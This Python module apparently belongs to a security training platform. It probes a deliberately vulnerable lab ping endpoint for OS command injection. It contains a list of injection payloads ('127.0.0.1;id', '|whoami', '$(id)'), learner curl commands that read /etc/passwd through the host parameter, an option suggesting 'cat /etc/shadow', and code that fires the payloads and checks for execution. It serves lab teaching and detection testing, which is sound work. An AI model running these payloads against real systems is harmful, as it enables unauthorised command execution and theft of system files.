"""
modules/cmd_injection.py — APP-02: Command Injection probe.

Target: GET /system/ping?host=<payload>
Vulnerability: host param passed to os.popen() unsanitized.
"""
from __future__ import annotations

from datetime import datetime, timezone

from core.base_module import BaseModule
from core.models import (
    AttackResult, Category, ModuleOption, Severity,
    StepResult, TargetConfig,
)

_PAYLOADS = [
    ("semicolon",  "127.0.0.1;id"),
    ("pipe",       "127.0.0.1|whoami"),
    ("double-amp", "127.0.0.1 && hostname"),
    ("subshell",   "$(id)"),
    ("backtick",   "127.0.0.1;cat /etc/hostname"),
]

_INDICATORS = ["uid=", "root", "www-data", "attense", "/bin/"]


class CmdInjectionModule(BaseModule):
    module_id = "cmd_injection"
    name = "Command Injection"
    description = (
        "Injects OS command separators into /system/ping and checks "
        "whether arbitrary command output appears in the response."
    )
    category = Category.INJECTION
    scenario_id = "APP-02"
    severity = Severity.CRITICAL
    # MITRE ATT&CK — exploit the public app to run shell commands as the web user.
    mitre = {
        "tactics": ["TA0001 Initial Access", "TA0002 Execution", "TA0007 Discovery"],
        "techniques": [
            {"id": "T1190", "name": "Exploit Public-Facing Application", "tactic": "Initial Access"},
            {"id": "T1059.004", "name": "Command and Scripting Interpreter: Unix Shell", "tactic": "Execution"},
            {"id": "T1033", "name": "System Owner/User Discovery", "tactic": "Discovery"},
        ],
    }
    lab = {
        "target_path": "/system/ping",
        "vulnerable_component": "Flask ping handler (system_bp.ping) — os.popen",
        "story": (
            "An internal diagnostics page runs `ping -c 2 <host>` and prints "
            "the raw output. The `host` argument is concatenated into a shell "
            "string. Prove that shell metacharacters let you run arbitrary "
            "commands as the web-server user."
        ),
        "learner_steps": [
            {"action": "Baseline the diagnostics feature with a clean host.",
             "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
             "command": "curl -s 'http://target-agent/system/ping?host=127.0.0.1'",
             "expected": "You see normal 'PING 127.0.0.1' output — establishing the expected behaviour."},
            {"action": "Inject a command separator and run 'id'.",
             "technique": "T1059.004 Command and Scripting Interpreter: Unix Shell",
             "command": "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1;id'",
             "expected": "After the ping you see 'uid=…(www-data)…' — the id command executed."},
            {"action": "Confirm the execution context (who am I, where am I).",
             "technique": "T1033 System Owner/User Discovery",
             "command": "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1 && whoami && hostname'",
             "expected": "The web-server user and hostname print after the ping output."},
            {"action": "Read a sensitive file to show full impact.",
             "technique": "T1059.004 Command and Scripting Interpreter: Unix Shell",
             "command": "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1;cat /etc/passwd'",
             "expected": "The contents of /etc/passwd are displayed — arbitrary command execution confirmed."},
            {"action": "Check the Evidence panel for Wazuh detections.",
             "technique": "T1059.004 Command and Scripting Interpreter: Unix Shell",
             "command": "# review the activity log / Wazuh feed in ATTENSE",
             "expected": "Alert matches the shell-metacharacter pattern in the host parameter."},
        ],
        "detection_rule": "Wazuh cmd-injection signature (shell metacharacters in host param)",
        "success_markers": [
            "uid= or www-data in the HTTP response body",
            "✓ EXECUTED log lines",
            "Wazuh alert on /system/ping with metachar payload",
        ],
        "quick_probe": "/system/ping?host=127.0.0.1;id",
    }
    steps = [
        {'title': 'Probe /system/ping with benign host', 'tactic': 'Reconnaissance',
         'technique': 'T1595.002 Active Scanning: Vulnerability Scanning',
         'command': "curl -s 'http://target-agent/system/ping?host=127.0.0.1'",
         'hint': 'Baseline response for a clean 127.0.0.1 request', 'expected': 'HTTP 200 with ping output visible'},
        {'title': 'Inject shell metacharacters', 'tactic': 'Execution',
         'technique': 'T1059.004 Command and Scripting Interpreter: Unix Shell',
         'command': "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1;id'",
         'hint': 'Try separators ; | && $(…) against the host parameter', 'expected': 'Command output leaks back in the HTML response'},
        {'title': 'Confirm RCE indicators', 'tactic': 'Discovery',
         'technique': 'T1033 System Owner/User Discovery',
         'command': "curl -s -G http://target-agent/system/ping --data-urlencode 'host=127.0.0.1;cat /etc/passwd'",
         'hint': "Match on 'uid=', 'root', 'www-data', '/bin/'", 'expected': 'Successful step flagged CRITICAL'},
    ]

    def options(self) -> list[ModuleOption]:
        return [
            ModuleOption(
                name="custom_cmd",
                display_name="Custom Command",
                description="Optional: custom command to append (e.g. 'cat /etc/shadow')",
                default="",
            ),
            ModuleOption(
                name="endpoint",
                display_name="Ping Endpoint",
                description="Target endpoint path",
                default="/system/ping",
            ),
        ]

    def execute(self, target: TargetConfig, opts: dict, log_fn=None) -> AttackResult:
        started = datetime.now(timezone.utc).isoformat()
        steps: list[StepResult] = []
        endpoint = opts.get("endpoint", "/system/ping")
        confirmed = 0

        payloads = list(_PAYLOADS)
        custom = opts.get("custom_cmd", "").strip()
        if custom:
            payloads.append(("custom", f"127.0.0.1;{custom}"))

        # ── Recon (T1595.002): baseline benign ping before injecting ──
        self._log(log_fn, "Recon: baseline ping to 127.0.0.1 (expected behaviour)...")
        base = self._get(target.base_url + endpoint, params={"host": "127.0.0.1"},
                         label="recon-baseline", timeout=target.timeout)
        steps.append(base)

        self._log(log_fn, f"Testing {len(payloads)} command injection payloads against {endpoint}")

        for label, payload in payloads:
            url = target.base_url + endpoint
            r = self._get(url, params={"host": payload},
                          label=label, timeout=target.timeout)

            body = (r.detail or "").lower()
            hit = any(ind in body for ind in _INDICATORS)
            if hit:
                confirmed += 1
                r.evidence = f"COMMAND EXECUTED via {label}"

            symbol = "✓ EXECUTED" if hit else "– no indicator"
            self._log(log_fn, f"  [{label}] {symbol}  |  {payload}")
            steps.append(r)

        summary = f"{confirmed}/{len(payloads)} payloads confirmed command execution."
        return self._make_result(target, steps, summary, started)
